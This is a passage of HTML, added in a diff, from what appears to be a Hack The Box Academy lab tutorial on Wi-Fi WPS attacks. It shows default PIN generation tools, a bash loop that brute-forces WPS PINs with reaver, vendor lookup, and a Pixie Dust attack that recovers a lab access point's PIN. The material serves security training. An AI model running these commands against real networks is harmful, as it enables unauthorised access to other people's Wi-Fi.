+<span class="hljs-number">05294176</span>   Static PIN — UR-<span class="hljs-number">825</span>AC
+<span class="hljs-number">89532331</span>   <span class="hljs-number">36</span>-bit PIN
+<span class="hljs-number">68175542</span>   Static PIN — DSL-<span class="hljs-number">2740</span>R
+<span class="hljs-number">71412252</span>   Static PIN — Airocon <span class="hljs-number">2</span>
+<span class="hljs-number">80652847</span>   D-Link PIN
+<span class="hljs-number">76229909</span>   Static PIN — Broadcom <span class="hljs-number">3</span>
+<span class="hljs-number">46264848</span>   Static PIN — Broadcom <span class="hljs-number">2</span>
+<span class="hljs-number">82799427</span>   Reverse nibble <span class="hljs-number">48</span>-bit
+<span class="hljs-number">20233921</span>   Reverse byte <span class="hljs-number">48</span>-bit
+<span class="hljs-number">31957199</span>   Static PIN — Broadcom <span class="hljs-number">6</span>
+<span class="hljs-number">10864111</span>   Static PIN — Broadcom <span class="hljs-number">5</span>
+<span class="hljs-number">62327145</span>   Static PIN — Broadcom <span class="hljs-number">4</span>
+<span class="hljs-number">30432031</span>   Static PIN — Airocon <span class="hljs-number">1</span>
+<span class="hljs-number">90970948</span>   Reverse bits <span class="hljs-number">48</span>-bit
+<span class="hljs-number">22369628</span>   NIC * <span class="hljs-number">2</span>
+<span class="hljs-number">33554433</span>   NIC * <span class="hljs-number">3</span>
+<span class="hljs-number">34259283</span>   Static PIN — HG532x
+<span class="hljs-number">35611530</span>   Static PIN — Edimax
+<span class="hljs-number">20172527</span>   Static PIN — Broadcom <span class="hljs-number">1</span>
+<span class="hljs-number">67958146</span>   Static PIN — Thomson
+<span class="hljs-number">12345670</span>   Static PIN — Cisco
+<span class="hljs-number">74244973</span>   OUI + NIC
+</code></pre>
+<p>WPSPin outputs a variety of possible PINs for valid BSSIDs. To retrieve the WPA-PSK from a known PIN, we can use the following command.</p>
+<p>  Using Multiple Pre-defined PINs</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ sudo reaver --max-attempts=<span class="hljs-number">1</span> -l <span class="hljs-number">100</span> -r <span class="hljs-number">3</span>:<span class="hljs-number">45</span> -<span class="hljs-selector-tag">i</span> mon0 -<span class="hljs-selector-tag">b</span> <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:E0:A2:<span class="hljs-number">3</span>D:<span class="hljs-number">2</span>A -c <span class="hljs-number">1</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">73834410</span>
+</code></pre>
+<p>In the above command, <code>-l</code> sets the time to wait if the access point locks WPS PIN attempts, which is set to 100 seconds. The <code>-r</code> option specifies the recurring delay, meaning the command will sleep for 45 seconds every 3 attempts. The <code>--max-attempts=1</code> specifies that the tool will only attempt the PIN one time. This option ensures that the PIN is tested just once, rather than multiple attempts.</p>
+<p>However, doing this with a list of pre-defined PINs is not very efficient, as we have to re-execute this command for every potential PIN. Luckily, a bit of bash scripting can enable us to conduct a hands off approach for every PIN we generated.</p>
+<p>We can extract only the pins from the wpspin output using a combination of <code>grep</code> and <code>tr</code> commands:</p>
+<p>  Using Multiple Pre-defined PINs</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ wpspin -<span class="hljs-keyword">A</span> <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:E0:A2:<span class="hljs-number">3</span>D:<span class="hljs-number">2</span><span class="hljs-keyword">A</span> | grep -Eo '\b[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]{<span class="hljs-number">8</span>}\b' | tr '\n' ' '
+
+<span class="hljs-number">73834410</span> <span class="hljs-number">94229882</span> <span class="hljs-number">73834410</span> <span class="hljs-number">06490959</span> <span class="hljs-number">11184812</span> <span class="hljs-number">63311501</span> <span class="hljs-number">11184812</span> <span class="hljs-number">36499373</span> <span class="hljs-number">63313604</span> <span class="hljs-number">99956042</span> <span class="hljs-number">95661469</span> <span class="hljs-number">89478486</span> <span class="hljs-number">11184812</span> <span class="hljs-number">11184812</span> <span class="hljs-number">95755212</span> <span class="hljs-number">20854836</span> <span class="hljs-number">20144326</span> <span class="hljs-number">33946153</span> <span class="hljs-number">13142452</span> <span class="hljs-number">74163052</span> <span class="hljs-number">51875350</span> <span class="hljs-number">43977680</span> <span class="hljs-number">56587340</span> <span class="hljs-number">95719115</span> <span class="hljs-number">48563710</span> <span class="hljs-number">92148659</span> <span class="hljs-number">05294176</span> <span class="hljs-number">89532331</span> <span class="hljs-number">68175542</span> <span class="hljs-number">71412252</span> <span class="hljs-number">80652847</span> <span class="hljs-number">76229909</span> <span class="hljs-number">46264848</span> <span class="hljs-number">82799427</span> <span class="hljs-number">20233921</span> <span class="hljs-number">31957199</span> <span class="hljs-number">10864111</span> <span class="hljs-number">62327145</span> <span class="hljs-number">30432031</span> <span class="hljs-number">90970948</span> <span class="hljs-number">22369628</span> <span class="hljs-number">33554433</span> <span class="hljs-number">34259283</span> <span class="hljs-number">35611530</span> <span class="hljs-number">20172527</span> <span class="hljs-number">67958146</span> <span class="hljs-number">12345670</span> <span class="hljs-number">74244973</span>
+</code></pre>
+<p>This command filters and displays the 8-digit pins from the output file, separating them with spaces. We can now store this output in a variable of a bash script and use it for brute-forcing WPS, as shown below.</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash">#!/bin/bash
+
+#We add generated PINs into this list
+PINS='<span class="hljs-number">73834410</span> <span class="hljs-number">94229882</span> <span class="hljs-number">73834410</span> <span class="hljs-number">06490959</span> <span class="hljs-number">11184812</span> <span class="hljs-number">63311501</span> <span class="hljs-number">11184812</span> <span class="hljs-number">36499373</span> <span class="hljs-number">63313604</span> <span class="hljs-number">99956042</span> <span class="hljs-number">95661469</span> <span class="hljs-number">89478486</span> <span class="hljs-number">11184812</span> <span class="hljs-number">11184812</span> <span class="hljs-number">95755212</span> <span class="hljs-number">20854836</span> <span class="hljs-number">20144326</span> <span class="hljs-number">33946153</span> <span class="hljs-number">13142452</span> <span class="hljs-number">74163052</span> <span class="hljs-number">51875350</span> <span class="hljs-number">43977680</span> <span class="hljs-number">56587340</span> <span class="hljs-number">95719115</span> <span class="hljs-number">48563710</span> <span class="hljs-number">92148659</span> <span class="hljs-number">05294176</span> <span class="hljs-number">89532331</span> <span class="hljs-number">68175542</span> <span class="hljs-number">71412252</span> <span class="hljs-number">80652847</span> <span class="hljs-number">76229909</span> <span class="hljs-number">46264848</span> <span class="hljs-number">82799427</span> <span class="hljs-number">20233921</span> <span class="hljs-number">31957199</span> <span class="hljs-number">10864111</span> <span class="hljs-number">62327145</span> <span class="hljs-number">30432031</span> <span class="hljs-number">90970948</span> <span class="hljs-number">22369628</span> <span class="hljs-number">33554433</span> <span class="hljs-number">34259283</span> <span class="hljs-number">35611530</span> <span class="hljs-number">20172527</span> <span class="hljs-number">67958146</span> <span class="hljs-number">12345670</span> <span class="hljs-number">74244973</span>'
+
+for PIN in $PINS
+do
+    echo Attempting PIN: $PIN
+    sudo reaver --max-attempts=<span class="hljs-number">1</span> -l <span class="hljs-number">100</span> -r <span class="hljs-number">3</span>:<span class="hljs-number">45</span> -i mon0 -b <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:E0:A2:<span class="hljs-number">3</span>D:<span class="hljs-number">2</span><span class="hljs-keyword">A</span> -c <span class="hljs-number">1</span> -p $PIN
+done
+echo "PIN Guesses Complete"
+</code></pre>
+<p>With this script, we execute the same Reaver command for every PIN in the provided list. While it could be refined or built onto, the basic functionality is as follows:</p>
+<ul>
+<li>For each generated PIN attempted, the script will try the PIN only once, and then wait for 100 seconds if the access point (AP) locks</li>
+<li>Additionally, for every three attempts made, it will pause for 45 seconds.</li>
+<li>The script iterates through all the PINs in the list, which can be seen in action in the example below:</li>
+</ul>
+<p>  Using Multiple Pre-defined PINs</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ sudo bash pinguess.sh
+
+Attempting <span class="hljs-string">PIN:</span> <span class="hljs-number">73834410</span>
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.6</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">A2:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-number">2</span>A
+&lt;snip&gt;
+Attempting <span class="hljs-string">PIN:</span> <span class="hljs-number">94229882</span>
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.6</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">A2:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-number">2</span>A 
+&lt;snip&gt;
+Attempting <span class="hljs-string">PIN:</span> <span class="hljs-number">06490959</span>
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.6</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">A2:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-number">2</span>A
+&lt;snip&gt;
+Attempting <span class="hljs-string">PIN:</span> <span class="hljs-number">76229909</span>
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.6</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">A2:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-number">2</span>A
+&lt;snip&gt;
+</code></pre>
+<p>Hopefully, we will be able to find the correct WPS PIN using this bash script, which bruteforces with a provided list of generated PINs.</p>
+<hr>
+<h4 id="performing-vendor-lookup">Performing Vendor Lookup</h4>
+<p>If the access point is secured and locks after a few attempts, in some cases we can perform a vendor lookup to refine our list of potential PINs. This can be done using the <code>oui.txt</code> file included in Linux distributions. The <code>oui.txt</code> file contains information about the organizations that own different MAC address prefixes.</p>
+<p>To perform a vendor lookup, we can use the following <code>grep</code> command, specifying the first portion of the target network’s BSSID:</p>
+<p>  Using Multiple Pre-defined PINs</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ grep -<span class="hljs-selector-tag">i</span> <span class="hljs-string">"60-38-E0"</span> /var/lib/ieee-data/oui<span class="hljs-selector-class">.txt</span>
+
+<span class="hljs-number">60</span>-<span class="hljs-number">38</span>-E0   (hex)                Belkin International Inc.
+</code></pre>
+<p>By performing a vendor lookup and refining our PIN list, we can increase the likelihood of discovering the correct WPS PIN for the target access point. This method leverages known vendor defaults and vulnerabilities to enhance our bruteforcing efforts. If successful, this approach can help us retrieve the WPA-PSK and gain access to the secured network.</p>
+<p> In the lab environment, the access point (AP) has no lock, allowing for an unlimited number of bruteforce attempts.</p>
+<hr>
+<p>In the next section, we will demonstrate how to generate possible PINs based on the <code>BSSID</code> and <code>vendor lookup</code>. This technique leverages the fact that certain vendors use predictable algorithms to generate default WPS PINs based on the <code>BSSID</code>. By utilizing this information, we can generate a list of potential PINs that correspond to the vendor of the target access point (AP). Once we have these generated PINs, we can attempt to use them to access the AP.</p>
+<hr>
+<h2 id="using-pin-generation-tools">Using PIN Generation Tools</h2>
+<hr>
+<p>When crafting an online brute-forcing attempt, it can be cumbersome to guess all 11,000 possible PINs especially considering most access points are utilizing default PINs. Luckily, over the years many different libraries and tools have been developed to generate these default PINs. Some of these include the Arcadyan, Vodafone EasyBox, and ComputePIN default generation algorithms. In this section, we will explore how to utilize the <code>Vodafone EasyBox PIN generation algorithm</code>, along with the <code>WPS-PIN</code> script. These libraries will allow us to lower the total amount of guesses during online brute-forcing.</p>
+<hr>
+<h4 id="using-the-vodafone-easybox-default-wps-pin-algorithm">Using the Vodafone EasyBox Default WPS Pin Algorithm</h4>
+<p>In 2013, a vulnerability was discovered in DSL home gateways manufactured by Arcadyan Networks and rebranded for Vodafone Germany known as <a href="https://seclists.org/fulldisclosure/2013/Aug/51">Vodafone EasyBox Default WPS Pin Algorithm</a>. These devices had Wi-Fi access points enabled by default and could be accessed using the default WPS PIN (PIN External Registrar) printed on the back of the device. The algorithm used to generate the default WPS PIN is entirely based on the MAC address (BSSID) and the serial number of the device. The serial number can be derived from the MAC address.</p>
+<p>To begin, we can use a tool called <a href="https://github.com/eye9poob/Default-wps-pin">Default-wps-pin</a>, and start by cloning it from Github.</p>
+<p>  Using PIN Generation Tools</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/eye9poob/Default-wps-pin
+</code></pre>
+<p>Then, to use the tool, we simply employ the following command. We specify our BSSID, then observe as possible PINs are outputted into the terminal.</p>
+<p>  Using PIN Generation Tools</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ python2 /</span>opt<span class="hljs-regexp">/Default-wps-pin/</span><span class="hljs-keyword">default</span>-wps-pin.py <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">D4:</span><span class="hljs-string">A2:</span><span class="hljs-number">5</span>E
+
+derived serial <span class="hljs-string">number:</span> R---<span class="hljs-number">-55185</span>
+<span class="hljs-string">SSID:</span> Arcor|EasyBox|Vodafone<span class="hljs-number">-04</span>D755
+WPS <span class="hljs-string">pin:</span> <span class="hljs-number">27038895</span>
+</code></pre>
+<hr>
+<h4 id="using-wps-pin-to-generate-default-pin">Using WPS-PIN to Generate Default PIN</h4>
+<p>We can also use another script called <a href="https://github.com/linkp2p/WPS-PIN">WPS-PIN</a> to generate the WPS PIN from the BSSID.</p>
+<p>  Using PIN Generation Tools</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ /opt/WPSPIN.sh 
+
+              <span class="hljs-keyword">_</span>       <span class="hljs-keyword">_</span>  _____    _____   _____  _______  <span class="hljs-keyword">_</span>     <span class="hljs-keyword">_</span> 
+             (<span class="hljs-keyword">_</span>)  <span class="hljs-keyword">_</span>  (<span class="hljs-keyword">_</span>)(_____)  (_____) (_____)(_______)(<span class="hljs-keyword">_</span>)   (<span class="hljs-keyword">_</span>)
+             (<span class="hljs-keyword">_</span>) (<span class="hljs-keyword">_</span>) (<span class="hljs-keyword">_</span>)(<span class="hljs-keyword">_</span>)__(<span class="hljs-keyword">_</span>)(<span class="hljs-keyword">_</span>)___   (<span class="hljs-keyword">_</span>)__(<span class="hljs-keyword">_</span>)  (<span class="hljs-keyword">_</span>)   (__)<span class="hljs-keyword">_</span> (<span class="hljs-keyword">_</span>)
+             (<span class="hljs-keyword">_</span>) (<span class="hljs-keyword">_</span>) (<span class="hljs-keyword">_</span>)(_____)   (___)<span class="hljs-keyword">_</span> (_____)   (<span class="hljs-keyword">_</span>)   (<span class="hljs-keyword">_</span>)(<span class="hljs-keyword">_</span>)(<span class="hljs-keyword">_</span>)
+             (<span class="hljs-keyword">_</span>)<span class="hljs-keyword">_</span>(<span class="hljs-keyword">_</span>)<span class="hljs-keyword">_</span>(<span class="hljs-keyword">_</span>)(<span class="hljs-keyword">_</span>)       ____(<span class="hljs-keyword">_</span>)(<span class="hljs-keyword">_</span>)     __(<span class="hljs-keyword">_</span>)__ (<span class="hljs-keyword">_</span>)  (__)
+              (__) (__) (<span class="hljs-keyword">_</span>)      (_____) (<span class="hljs-keyword">_</span>)    (_______)(<span class="hljs-keyword">_</span>)   (<span class="hljs-keyword">_</span>)    
+
+ www.crack-wifi.com     www.facebook.com/soufian.ckin2u    www.auditoriaswireless.net
+
+               <span class="hljs-built_in">by</span> kcdtv feat. antares_145,  r00tnuLL and <span class="hljs-number">1</span>camaron1
+               including computepinC83A35 algorithm <span class="hljs-built_in">by</span> ZaoChunseng 
+
+                   DEFAULT PIN GENERATOR &amp; WPS PROTOCOL ATTACK
+
+
+                         +---------------------------+     
+                         |     <span class="hljs-type">1</span>  -  ENGLISH         |     
+                         <span class="hljs-type">|     2</span>  -  ESPANOL         |     
+                         <span class="hljs-type">|     3</span>  -  FRANCAIS        |     
+                         <span class="hljs-type">+---------------------------+     
+
+
+                                Language</span> : <span class="hljs-number">1</span>
+
+          WARNING :  NO COMPATIBLE WIRELESS INTERFACE IS AVAILABLE   
+     WPSPIN will be executed <span class="hljs-built_in">in</span> a reduced mode without scanning or attack
+             You can reload interface checking <span class="hljs-built_in">with</span> option <span class="hljs-number">2</span>
+
+
+
+                                     ¿     ?           
+                                ?       ?              
+                               ¿   &gt;X&lt;    ¿          
+                               -  (O o)  -         
+                    +---------ooO--(<span class="hljs-keyword">_</span>)--Ooo-------------+   
+                    |                                   <span class="hljs-type">|   
+                    |    1</span> -  GENERATE PIN              |   
+                    <span class="hljs-type">|    2</span> -  RELOAD INTERFACES CHECK   |   
+                    <span class="hljs-type">|    3</span> -  EXIT WPSPIN               |   
+                    <span class="hljs-type">|                                   |   
+                    +-----------------------------------+   
+
+
+
+
+                              Your</span> choice : <span class="hljs-number">1</span>
+
+                    -------------------------------------
+
+                <span class="hljs-number">1</span> &gt; Insert eSSID and press &lt;Enter&gt; : HackTheBox
+
+                <span class="hljs-number">2</span> &gt; Insert bSSID and press &lt;Enter&gt; : <span class="hljs-number">72</span>:<span class="hljs-number">40</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">74</span>:<span class="hljs-number">2</span>f:<span class="hljs-number">3</span>b
+
+--------------------------------------------------
+       ¡UNKNOWN OR UNSUPPORTED MODEL!   
+--------------------------------------------------
+                 POSSIBLE PIN &gt; <span class="hljs-number">76142673</span> 
+
+      ......  press &lt;enter&gt; to continue......
+</code></pre>
+<hr>
+<h4 id="using-naranja-mekanik-nmk-to-generate-wps-pin">Using Naranja MekaniK (nmk) to generate WPS PIN</h4>
+<p><a href="https://github.com/kcdtv/nmk">Naranja MekaniK (nmk)</a> is a tool kit that proposes different ways to generate the default WPS PIN for:</p>
+<ul>
+<li>Arcadyan ARV7519RW22</li>
+<li>Arcadyan ARV7520CW22</li>
+<li>Arcadyan VRV9510KWAC23</li>
+</ul>
+<p>The first two models are also known as <code>Livebox 2.1</code>, and the third one is known as <code>Livebox Next</code>.</p>
+<p>We need to enter the last four digits of the BSSID (from the 2.4GHz network) and the last four digits of the serial number. The serial number can be found on a sticker attached to the back of the router.</p>
+<p>  Using PIN Generation Tools</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$  python2 /opt</span><span class="hljs-regexp">/nmk/orangen</span>.py A2BD <span class="hljs-number">7281</span>
+
+<span class="hljs-number">99559236</span>
+</code></pre>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In this section, we explored various methods to obtain WPS default PINs for certain vendors. Hopefully, by this point, we are able to retrieve the WPS PIN and WPA-PSK using these less aggressive methods. In the next section, we will explore another WPS attack known as the Pixie Dust Attack (Offline Method). This method can potentially provide us with the WPS PIN in seconds if the target is vulnerable.</p>
+<p> The tools showcased in this section can be found inside the /opt directory of the lab machine.</p>
+<hr>
+<h2 id="pixie-dust-attack-overview">Pixie Dust Attack Overview</h2>
+<hr>
+<p>Some vendors such as Ralink, Realtek, MediaTek, and Broadcom are susceptible to offline bruteforcing techniques through the <code>Pixie Dust Attack</code>. This is due to bad randomization during nonce generation. The E-S1 and E-S2 nonce values are 128-bits. As such, if we were to try to blindly bruteforce the hash values through variable brute force, this would take a very long time. Due to certain vendors having bad/predictable nonce value generation, we can retrieve these values, which makes bruteforcing on the E-Hash1 and E-Hash2 values much quicker. This helps eliminate the need to conduct online bruteforcing through every iteration of a possible PIN.</p>
+<p>If we recall, during the M1 and M2 messages, the PKe and PKr values are shared between the enrollee (client) and registrar (AP), respectively. Additionally, during the M3 message, we receive the E-Hash1 and E-Hash2 values. Simply put, the E-Hash1 and E-Hash2 values are structured as shown below.</p>
+<ul>
+<li><code>E-Hash1 = (E-S1 nonce value | PSK1 | PKe | PKr)</code></li>
+<li><code>E-Hash2 = (E-S2 nonce value | PSK2 | PKe | PKr)</code></li>
+</ul>
+<p>During the initial message exchange with the access point, we already know the PKe and PKr values. To crack these HMAC-SHA-256 hashes, we need to guess the E-S1 and E-S2 nonce values, as the resulting values will form both portions of our PIN (the PSK1 and PSK2 values).</p>
+<p>In order to elaborate on Pixie Dust attacks and bad random nonce generation, these next few examples will help, but are not exhaustive.</p>
+<ol>
+<li><p>Certain Ralink and Mediatek chipsets contain the same zero nonce generation issue for WPS. This means that the nonce values are never generated, and instead are always set to zero. As such, we know all values except the PSK1 and PSK2 values respectively.</p>
+</li>
+<li><p><code>E-Hash1 = (E-S1 (0) | PSK1 | PKe (known) | PKr (known) )</code></p>
+</li>
+<li><p><code>E-Hash2 = (E-S2 (0) | PSK2 | PKe (known) | PKr (known) )</code></p>
+</li>
+<li><p>Certain Broadcom chipsets use the same random number generation algorithm to generate the nonce values, as well as other values such as the N1 enrollee nonce or PKe. Since these values are generated using the same algorithm, bruteforcing looks like the following.</p>
+</li>
+<li><p><code>We guess all seed values until we find the correct ones that generated the N1 enrollee nonce or PKe value, then generate the respective E-S1 and E-S2 nonce values.</code></p>
+</li>
+<li><p><code>We are then able to retrieve the PSK1 and PSK2 values.</code></p>
+</li>
+<li><p>Similarly, certain Realtek chipsets have issues with how they generate seeds for random values. These vulnerable chipsets utilize Unix timestamps from the WPS EAP message exchange as seed values for generating the E-S1, E-S2, and PKe enrollee values. With most timing-based attacks, depending on the delay and speed of message delivery, these values are often identical or differ by only a small increment. Overall, the process looks like the following:</p>
+</li>
+<li><p><code>E-S1 = E-S2 = PKe or E-S1 = E-S2 = PKe + N</code></p>
+</li>
+<li><code>Due to the weak random (Unix timestamp) seed, the E-S1, E-S2, and PKe values are often identical, or incrementally different by a small value, N.</code></li>
+<li><code>We increment through guesses of the seed values that were used to generate the PKe. This then allows us to guess the E-S1 and E-S2 values, respectively.</code></li>
+<li><code>We are then able to retrieve the PSK1 and PSK2 values respectively.</code></li>
+</ol>
+<p>Not all Pixie Dust attacks are equal, but generally they are much quicker to conduct than traditional online brute-forcing techniques. This is due to us guessing the nonce values, rather than guessing one of the possible 11,000 PIN combinations. By doing so, we can retrieve the correct PIN within a few seconds to a couple hours, as opposed to waiting several hours for an online attempt to potentially succeed. Another advantage of Pixie Dust attacks is the low number of PIN guesses required. For access points with locking mechanisms, this can be tremendously beneficial when attempting to avoid being locked out.</p>
+<p>In the next section, we will explore how to employ Pixie Dust attacks to retrieve the PIN and WPA-PSK.</p>
+<hr>
+<h2 id="the-pixie-dust-attack">The Pixie Dust Attack</h2>
+<hr>
+<p>The Pixie Dust Attack is a well-known method for exploiting vulnerabilities in the WPS (Wi-Fi Protected Setup) protocol, used to retrieve the WPA/WPA2 pre-shared key (PSK) from a target wireless network. The attack takes advantage of weaknesses in the WPS implementation, specifically the way some routers handle the WPS PIN verification process. There are numerous tools available for performing Pixie Dust attacks, but we will focus on two major ones: Reaver and Oneshot.</p>
+<hr>
+<h4 id="using-reaver">Using Reaver</h4>
+<p>To perform a Pixie Dust attack with <code>Reaver</code>, we require a network interface running in monitor mode. We can create a new interface <code>mon0</code> and enable monitor mode using the following commands.</p>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor
+
+rootlrahmanTamim@htb[/htb]$ ifconfig mon0 up
+
+rootlrahmanTamim@htb[/htb]$ iwconfig
+
+lo        <span class="hljs-literal">no</span> wireless extensions.
+
+eth0      <span class="hljs-literal">no</span> wireless extensions.
+
+mon0      IEEE <span class="hljs-number">802.11</span>  Mode:Monitor  Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry short limit:<span class="hljs-number">7</span>   RTS thr:<span class="hljs-literal">off</span>   Fragment thr:<span class="hljs-literal">off</span>
+          Power Management:<span class="hljs-literal">on</span>
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  ESSID:<span class="hljs-literal">off</span>/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry short limit:<span class="hljs-number">7</span>   RTS thr:<span class="hljs-literal">off</span>   Fragment thr:<span class="hljs-literal">off</span>
+          Encryption key:<span class="hljs-literal">off</span>
+          Power Management:<span class="hljs-literal">on</span>
+</code></pre>
+<p>Once the interface is in monitor mode, we scan for available Wi-Fi networks with <code>airodump-ng</code>.</p>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$  airodump-ng mon0 --wps
+
+ CH <span class="hljs-number"> 3 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2024-06-16 19:32 
+
+ BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID</span>
+
+ 86:FC:9F:5D:67:4E  -28      <span class="hljs-number"> 11 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  2.0    HackMe
+</code></pre>
+<p>The output reveals a WPS WiFi network named <code>HackMe</code>. We can use Reaver to perform a Pixie Dust attack against it, specifying the <code>-K</code> (or <code>--pixie-dust</code>) option.</p>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ reaver -K <span class="hljs-number">1</span> -vvv -b <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E -c <span class="hljs-number">1</span> -i mon0
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.5</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Switching mon0 to channel <span class="hljs-number">1</span>
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E
+[+] Received beacon from <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E
+<span class="hljs-string">WPS:</span> A <span class="hljs-keyword">new</span> PIN configured (timeout=<span class="hljs-number">0</span>)
+<span class="hljs-string">WPS:</span> UUID - hexdump(len=<span class="hljs-number">16</span>): [NULL]
+<span class="hljs-string">WPS:</span> PIN - hexdump_ascii(len=<span class="hljs-number">8</span>):    
+&lt;SNIP&gt;
+ [?] Mode:     <span class="hljs-number">1</span> (RT<span class="hljs-regexp">/MT/</span>CL)
+ [*] Seed <span class="hljs-string">N1:</span>  <span class="hljs-number">0x08098b13</span>
+ [*] Seed <span class="hljs-string">ES1:</span> <span class="hljs-number">0x00000000</span>
+ [*] Seed <span class="hljs-string">ES2:</span> <span class="hljs-number">0x00000000</span>
+ [*] <span class="hljs-string">PSK1:</span>     fe3fce4475701deda27e52518cc8be56
+ [*] <span class="hljs-string">PSK2:</span>     <span class="hljs-number">2</span>dc52385b199358cea1ad97d1995bca2
+ [*] <span class="hljs-string">ES1:</span>      <span class="hljs-number">00000000000000000000000000000000</span>
+ [*] <span class="hljs-string">ES2:</span>      <span class="hljs-number">00000000000000000000000000000000</span>
+ [+] WPS <span class="hljs-string">pin:</span>  <span class="hljs-number">32552273</span>
+
+ [*] Time <span class="hljs-string">taken:</span> <span class="hljs-number">0</span> s <span class="hljs-number">34</span> ms
+</code></pre>
+<p>The Pixie Dust attack was successful, and the PIN <code>32552273</code> was recovered. We can subsequently use this PIN to obtain the PSK (Pre-Shared Key) for the WiFi network.</p>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ reaver -b <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E -c <span class="hljs-number">1</span> -p <span class="hljs-number">32552273</span> -i mon0
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.5</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
